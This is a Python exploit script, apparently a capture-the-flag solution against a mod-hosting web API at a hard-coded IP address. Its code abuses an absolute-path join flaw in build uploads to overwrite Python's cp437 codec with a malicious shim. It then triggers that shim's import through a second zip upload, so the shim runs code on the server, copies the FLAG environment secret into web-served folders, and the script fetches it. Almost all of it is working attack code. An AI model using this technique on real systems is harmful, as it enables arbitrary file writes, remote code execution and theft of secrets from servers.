#!/usr/bin/env python3
import requests, sys, io, zipfile, secrets, time, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://144.79.188.39:42166"
if not BASE.startswith("http"):
    BASE = "http://" + BASE

def fresh():
    u = "u" + secrets.token_hex(4)
    pw = "Pass12345!"
    requests.post(f"{BASE}/api/auth/register/", json={"username": u, "password": pw}, timeout=15)
    r = requests.post(f"{BASE}/api/auth/login/", json={"username": u, "password": pw}, timeout=15)
    return r.json()["access"], u

def H(tok):
    return {"Authorization": f"Bearer {tok}"}

def get_or_create_plat(tok, code, name="z"):
    r = requests.get(f"{BASE}/api/platforms/", headers=H(tok), timeout=15).json()
    for it in (r.get("results", r) if isinstance(r, dict) else r) or []:
        if isinstance(it, dict) and it.get("code") == code:
            return it["id"]
    rp = requests.post(f"{BASE}/api/platforms/", headers=H(tok),
        json={"code": code, "name": name}, timeout=15)
    return rp.json().get("id")

print(f"[*] Target: {BASE}")

OUT = "flag_cp437_" + secrets.token_hex(4) + ".txt"

# cp437 shim that executes RCE on import and also provides getregentry so caller doesn't crash
SHIM = f"""import os, codecs

try:
    with open('/usr/share/nginx/html/{OUT}', 'w') as f:
        f.write(os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass

try:
    with open('/data/media/{OUT}', 'w') as f:
        f.write(os.environ.get('FLAG', 'NOFLAG') + '\\n')
except Exception:
    pass

### Codec APIs so zipfile doesn't fail
class Codec(codecs.Codec):
    def encode(self, input, errors='strict'):
        return codecs.charmap_encode(input, errors, encoding_table)
    def decode(self, input, errors='strict'):
        return codecs.charmap_decode(input, errors, decoding_table)

class IncrementalEncoder(codecs.IncrementalEncoder):
    def encode(self, input, final=False):
        return codecs.charmap_encode(input, self.errors, encoding_table)[0]

class IncrementalDecoder(codecs.IncrementalDecoder):
    def decode(self, input, final=False):
        return codecs.charmap_decode(input, self.errors, decoding_table)[0]

class StreamWriter(Codec, codecs.StreamWriter):
    pass

class StreamReader(Codec, codecs.StreamReader):
    pass

def getregentry():
    return codecs.CodecInfo(
        name='cp437',
        encode=Codec().encode,
        decode=Codec().decode,
        incrementalencoder=IncrementalEncoder,
        incrementaldecoder=IncrementalDecoder,
        streamreader=StreamReader,
        streamwriter=StreamWriter,
    )

decoding_table = tuple(chr(i) for i in range(256))
encoding_table = codecs.charmap_build(decoding_table)
"""

print(f"[*] Output file: {OUT}")

# STEP 1: Overwrite /usr/local/lib/python3.11/encodings/cp437.py
# mod_version = "/usr/local/lib" (14 chars <= 20) -> pathlib absolute path resets root!
# platform_code = "python3.11/encodings" (20 chars <= 20)
# storage_dir = Path('/data/media') / 'builds' / '/usr/local/lib' / 'python3.11/encodings'
#             = Path('/usr/local/lib/python3.11/encodings')
tok1, u1 = fresh()
pid = get_or_create_plat(tok1, "python3.11/encodings")
print(f"[*] Platform (python3.11/encodings) ID: {pid}")

mid = requests.post(f"{BASE}/api/mods/", headers=H(tok1),
    json={"title":"z", "mod_version":"/usr/local/lib", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
print(f"[*] Mod (/usr/local/lib) ID: {mid}")

bid = requests.post(f"{BASE}/api/mods/{mid}/builds/", headers=H(tok1),
    json={"platform": pid}, timeout=15).json()["id"]
print(f"[*] Build ID: {bid}")

bio = io.BytesIO()
with zipfile.ZipFile(bio, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.writestr("cp437.py", SHIM)
bio.seek(0)

r_upload = requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/", headers=H(tok1),
    files={"zip_file": ("exploit.zip", bio, "application/zip")}, timeout=30)
print(f"[*] Upload cp437.py to /usr/local/lib/python3.11/encodings/ -> status: {r_upload.status_code}")
if r_upload.status_code != 200:
    print(f"[-] Response: {r_upload.text}")
    sys.exit(1)

# STEP 2: Trigger cp437 import via non-UTF8 zip entry
print("[*] Uploading trigger zip with ASCII filename...")
tok2, u2 = fresh()
pid_t = get_or_create_plat(tok2, "trigger_plat")
mid_t = requests.post(f"{BASE}/api/mods/", headers=H(tok2),
    json={"title":"z", "mod_version":"v_trig", "release_notes":"", "is_enabled":True}, timeout=15).json()["id"]
bid_t = requests.post(f"{BASE}/api/mods/{mid_t}/builds/", headers=H(tok2),
    json={"platform": pid_t}, timeout=15).json()["id"]

bio_t = io.BytesIO()
with zipfile.ZipFile(bio_t, 'w', zipfile.ZIP_DEFLATED) as zf_t:
    zf_t.writestr("trigger_file.txt", b"trigger content")
bio_t.seek(0)

r_trig = requests.post(f"{BASE}/api/mods/{mid_t}/builds/{bid_t}/upload/", headers=H(tok2),
    files={"zip_file": ("trigger.zip", bio_t, "application/zip")}, timeout=30)
print(f"[*] Trigger upload status: {r_trig.status_code}")

time.sleep(1)

# STEP 3: Retrieve Flag
print(f"\n[*] Fetching flag from endpoints...")
for url, label in [(f"{BASE}/{OUT}", "nginx /"), (f"{BASE}/media/{OUT}", "media /media/")]:
    rf = requests.get(url, timeout=10)
    print(f"  [{label}] status {rf.status_code}: {rf.text[:100] if rf.ok else ''}")
    m = re.search(r"PTITCTF\{[^}]+\}", rf.text)
    if m:
        print(f"\n==========================================")
        print(f">>> FLAG FOUND: {m.group(0)}")
        print(f"==========================================")
        
        # Save to final_flag.txt
        with open("final_flag.txt", "w") as f:
            f.write(m.group(0) + "\n")
        break
